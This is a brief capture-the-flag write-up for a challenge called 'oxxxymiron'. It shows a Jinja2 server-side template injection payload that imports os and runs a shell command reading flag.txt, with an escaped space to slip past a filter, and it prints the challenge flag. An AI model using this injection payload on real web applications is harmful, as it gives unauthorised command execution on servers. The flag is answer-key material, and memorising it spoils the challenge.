# oxxxymiron writeup

Here is the example of server, that just returns SSTI-string.

```python
def index():
    return '{{request.application.__globals__.__builtins__.__import__("os").popen("cat\\x20flag.txt").read()}}'
```

This will read flag. Example of solution is in [solve.py](solve.py)

Flag: `li2CTF{I_r3Pe4t_My5elF_wH3n_4nDEr_Stre$$}`
